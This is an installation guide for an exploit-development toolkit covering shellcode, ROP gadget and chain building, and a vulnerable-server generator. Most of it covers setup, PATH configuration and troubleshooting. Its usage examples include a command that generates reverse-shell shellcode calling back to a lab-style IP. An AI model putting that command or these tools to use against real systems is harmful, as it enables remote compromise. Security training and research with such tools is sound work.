# Installation Guide

This guide will help you install the ROP Tools Suite and make all tools available system-wide via symbolic links.

## Choose Your Installation Method

### Method 1: Virtual Environment Installation (Recommended)
Uses an isolated Python virtual environment with dedicated dependencies. The tools in `~/.local/bin/` will use the venv Python interpreter.

### Method 2: Direct Installation
Uses your system Python interpreter directly. Simpler but dependencies are installed globally.

---

## Method 1: Virtual Environment Installation (Recommended)

This method creates a virtual environment and wrapper scripts that use the venv Python interpreter.

### Step 1: Setup Virtual Environment

```bash
# Navigate to the repository
cd /path/to/rop_tools

# Run the setup script
./setup_venv.sh
```

This will:
- Create a virtual environment in `venv/`
- Install all dependencies from `requirements.txt`
- Upgrade pip to the latest version

### Step 2: Install Tools System-Wide

```bash
# Run the installation script
./install_with_venv.sh
```

This will:
- Create wrapper scripts in `bin/` that use the venv Python
- Create symbolic links in `~/.local/bin/` pointing to the wrappers
- Make all tools available system-wide

### Verify Installation

```bash
which shellgen
# Should show: /Users/yourusername/.local/bin/shellgen

shellgen --help
```

---

## Method 2: Direct Installation

Run the following commands to install all tools to `~/.local/bin/`:

```bash
# Navigate to the repository
cd /path/to/rop_tools

# Create ~/.local/bin directory if it doesn't exist
mkdir -p ~/.local/bin

# Make all Python scripts executable
chmod +x shellgen/shellgen_cli.py
chmod +x shellgen/hash_generator.py
chmod +x rop/get_rop_gadgets.py
chmod +x rop/get_base_address.py
chmod +x rop/rop_worksheet.py
chmod +x target_builder/target_builder_cli.py

# Create symbolic links
ln -sf "$(pwd)/shellgen/shellgen_cli.py" ~/.local/bin/shellgen
ln -sf "$(pwd)/shellgen/hash_generator.py" ~/.local/bin/hash_generator
ln -sf "$(pwd)/rop/get_rop_gadgets.py" ~/.local/bin/get_rop_gadgets
ln -sf "$(pwd)/rop/get_base_address.py" ~/.local/bin/get_base_address
ln -sf "$(pwd)/rop/rop_worksheet.py" ~/.local/bin/rop_worksheet
ln -sf "$(pwd)/target_builder/target_builder_cli.py" ~/.local/bin/target_builder
```

## Add to PATH

Ensure `~/.local/bin` is in your PATH by adding this to your shell configuration file:

### For Bash (`~/.bashrc` or `~/.bash_profile`):
```bash
export PATH="$HOME/.local/bin:$PATH"
```

### For Zsh (`~/.zshrc`):
```bash
export PATH="$HOME/.local/bin:$PATH"
```

### For Fish (`~/.config/fish/config.fish`):
```fish
set -gx PATH $HOME/.local/bin $PATH
```

After adding to your shell config, reload it:
```bash
# For Bash
source ~/.bashrc

# For Zsh
source ~/.zshrc

# For Fish
source ~/.config/fish/config.fish
```

## Verify Installation

Check that all commands are available:

```bash
which shellgen
which hash_generator
which get_rop_gadgets
which get_base_address
which rop_worksheet
which target_builder
```

All commands should show: `~/.local/bin/<command_name>`

### Install Dependencies

Before using the tools, install the required Python dependencies:

```bash
pip install -r requirements.txt
```

---

## Test the Installation

Try running each tool:

```bash
# Test shellgen
shellgen --help

# Test hash generator
hash_generator --help

# Test ROP gadgets tool
get_rop_gadgets --help

# Test base address tool
get_base_address --help

# Test ROP worksheet
rop_worksheet --help

# Test target builder
target_builder --help
```

## Available Commands

After installation, the following commands will be available system-wide:

| Command            | Description                            | Source                       |
|--------------------|----------------------------------------|------------------------------|
| `shellgen`         | Multi-architecture shellcode generator | `shellgen/shellgen_cli.py`   |
| `hash_generator`   | ROR13 hash generator for API names     | `shellgen/hash_generator.py` |
| `get_rop_gadgets`  | Parse and filter ROP gadgets           | `rop/get_rop_gadgets.py`     |
| `get_base_address` | Extract PE base address and info       | `rop/get_base_address.py`    |
| `rop_worksheet`    | Interactive ROP chain building         | `rop/rop_worksheet.py`       |
| `target_builder`   | Vulnerable server generator            | `target_builder/target_builder_cli.py` |

## Usage Examples

### Generate Windows Shellcode
```bash
shellgen --platform windows --payload reverse_shell \
  --host 10.10.14.5 --port 443 --arch x64
```

### Generate API Hash
```bash
hash_generator LoadLibraryA
```

### Find ROP Gadgets
```bash
get_rop_gadgets -f gadgets.txt -i pop -b "\x00\x0a" -m 3
```

### Get Base Address
```bash
get_base_address kernel32.dll -v
```

### Build ROP Chains
```bash
rop_worksheet
```

### Generate Vulnerable Server
```bash
target_builder --vuln bof --protocol tcp --output server.cpp --build-script
```

## Uninstallation

### Remove Symbolic Links

```bash
rm ~/.local/bin/shellgen
rm ~/.local/bin/hash_generator
rm ~/.local/bin/get_rop_gadgets
rm ~/.local/bin/get_base_address
rm ~/.local/bin/rop_worksheet
rm ~/.local/bin/target_builder
```

### Remove Virtual Environment (if using Method 1)

```bash
cd /path/to/rop_tools
rm -rf venv/
rm -rf bin/
```

## Troubleshooting

### Command not found after installation

1. Verify `~/.local/bin` is in your PATH:
   ```bash
   echo $PATH | grep -o "$HOME/.local/bin"
   ```

2. Check if symbolic links exist:
   ```bash
   ls -la ~/.local/bin/
   ```

3. Ensure scripts are executable:
   ```bash
   ls -l shellgen/shellgen_cli.py rop/*.py shellgen/hash_generator.py
   ```

### Permission denied errors

Make sure scripts are executable:
```bash
chmod +x shellgen/shellgen_cli.py
chmod +x shellgen/hash_generator.py
chmod +x rop/get_rop_gadgets.py
chmod +x rop/get_base_address.py
chmod +x rop/rop_worksheet.py
chmod +x target_builder/target_builder_cli.py
```

### Import errors

**For Method 1 (venv):** Dependencies should already be installed. If not:
```bash
source venv/bin/activate
pip install -r requirements.txt
```

**For Method 2 (direct):** Install dependencies:
```bash
pip install -r requirements.txt
```

For specific tool dependencies:
- **shellgen**: `keystone-engine`, `capstone`
- **get_base_address**: `pefile`
- **All tools**: `rich` (optional, for colored output)

### Wrong Python interpreter (venv users)

If tools are using system Python instead of venv Python:

1. Check which Python is being used:
   ```bash
   head -n 1 ~/.local/bin/shellgen
   ```

2. Reinstall using Method 1:
   ```bash
   ./install_with_venv.sh
   ```

## Alternative Installation Methods

### System-wide Installation (requires sudo)

```bash
sudo ln -sf "$(pwd)/shellgen/shellgen_cli.py" /usr/local/bin/shellgen
sudo ln -sf "$(pwd)/shellgen/hash_generator.py" /usr/local/bin/hash_generator
sudo ln -sf "$(pwd)/rop/get_rop_gadgets.py" /usr/local/bin/get_rop_gadgets
sudo ln -sf "$(pwd)/rop/get_base_address.py" /usr/local/bin/get_base_address
sudo ln -sf "$(pwd)/rop/rop_worksheet.py" /usr/local/bin/rop_worksheet
sudo ln -sf "$(pwd)/target_builder/target_builder_cli.py" /usr/local/bin/target_builder
```

### Custom Installation Directory

Replace `~/.local/bin` with your preferred directory:

```bash
INSTALL_DIR="$HOME/bin"  # or any other directory
mkdir -p "$INSTALL_DIR"
ln -sf "$(pwd)/shellgen/shellgen_cli.py" "$INSTALL_DIR/shellgen"
ln -sf "$(pwd)/shellgen/hash_generator.py" "$INSTALL_DIR/hash_generator"
ln -sf "$(pwd)/rop/get_rop_gadgets.py" "$INSTALL_DIR/get_rop_gadgets"
ln -sf "$(pwd)/rop/get_base_address.py" "$INSTALL_DIR/get_base_address"
ln -sf "$(pwd)/rop/rop_worksheet.py" "$INSTALL_DIR/rop_worksheet"
ln -sf "$(pwd)/target_builder/target_builder_cli.py" "$INSTALL_DIR/target_builder"

# Add to PATH
export PATH="$INSTALL_DIR:$PATH"
```

## Development Installation

If you're actively developing these tools, the symbolic link approach is ideal because:

- Changes to source files are immediately available
- No need to reinstall after code changes
- Easy to switch between different versions/branches

## Support

For issues or questions:
- Check the [main README](README.md) for tool documentation
- Review tool-specific READMEs in `shellgen/` and `rop/` directories
- Open an issue on GitHub

---

**⚠️ Remember: Always obtain explicit authorization before testing any system you do not own.**